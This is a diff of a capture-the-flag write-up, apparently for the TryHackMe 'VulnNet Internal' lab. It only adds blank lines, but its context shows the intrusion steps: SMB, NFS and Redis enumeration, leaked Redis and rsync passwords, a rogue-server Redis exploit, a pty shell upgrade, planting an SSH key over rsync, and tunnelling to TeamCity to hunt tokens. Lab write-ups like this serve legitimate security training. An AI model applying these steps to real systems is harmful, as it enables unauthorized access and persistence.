@@ -21,6 +21,7 @@ rustscan -a 10.10.218.65 --ulimit 5000 -- -A
 ![image2](../resources/cad653e3ffce4c7ea3a61d896e204d71.png)
 
 - SMBMap:
+
 ```bash
 smbmap -H 10.10.218.65 -u Guest
 
@@ -35,6 +36,7 @@ cat services.txt
 
 ```
 - Connect to redis:
+
 ```bash
 redis-cli -h 10.10.218.65
 
@@ -45,6 +47,7 @@ redis-cli -h 10.10.218.65
 This means that you need valid credentials to access the Redis instance
 
 - Moving on to NFS (port 2049):
+
 ```bash
 showmount -e 10.10.218.65
 
@@ -71,6 +74,7 @@ sudo mount -t nfs 10.10.218.65:/opt/conf /tmp/vulnnet -o nolock
 ![image8](../resources/35252db72c29414e9e97d53121d9c7a1.png)
 
 - Connect to redis again with password:
+
 ```bash
 redis-cli -h 10.10.218.65 -a B65Hx562F@ggAZ@F
 
@@ -126,6 +130,7 @@ git clone https://github.com/n0b0dyCN/redis-rogue-server.git
 ![image15](../resources/6aff8937631d4a2989baf8f2d7c9ca7d.png)
 
 - Upgrade shell:
+
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
@@ -171,6 +176,7 @@ rsync://rsync-connect@127.0.0.1 with password **Hcg3HP67@TW@Bc72v**
 <https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync>
 
 - List the shared folders:
+
 ```bash
 rsync -av --list-only rsync://10.10.193.202
 
@@ -179,6 +185,7 @@ rsync -av --list-only rsync://10.10.193.202
 ![image21](../resources/95db062e9f5547c19c33c72af1cf170d.png)
 
 - Connect to folder:
+
 ```bash
 rsync rsync://rsync-connect@10.10.193.202/files
 
@@ -187,6 +194,7 @@ rsync rsync://rsync-connect@10.10.193.202/files
 ![image22](../resources/21f618793743439c9ff0f07cfab1c868.png)
 
 - Copy remote folder's files to Kali:
+
 ```bash
 mkdir rsync_folder
 
@@ -210,6 +218,7 @@ cat user.txt
 ![image25](../resources/7fe873bdc131490298e89db76231a78d.png)
 
 - Create ssh keypair and upload:
+
 ```bash
 ssh-keygen -t rsa
 
@@ -228,6 +237,7 @@ rsync -av authorized_keys rsync://rsync-connect@10.10.193.202/files/sys-internal
 
 ```
 - SSH in:
+
 ```bash
 ssh -i id_rsa sys-internal@10.10.193.202
 
@@ -239,6 +249,7 @@ ssh -i id_rsa sys-internal@10.10.193.202
 ![image27](../resources/ada00581f25447f9b9ea0e1ebfa5f59f.png)
 
 - Check network connections:
+
 ```bash
 ss -pant
 
@@ -265,6 +276,7 @@ ssh -L 8111:localhost:8111 sys-internal@10.10.193.202 -i id_rsa
 
 ![image30](../resources/75abd56cf95840e5b6899471a0beb94f.png)
 - On the SSH session:
+
 ```bash
 grep -rnw /TeamCity/ -e "token" 2>/dev/null
 
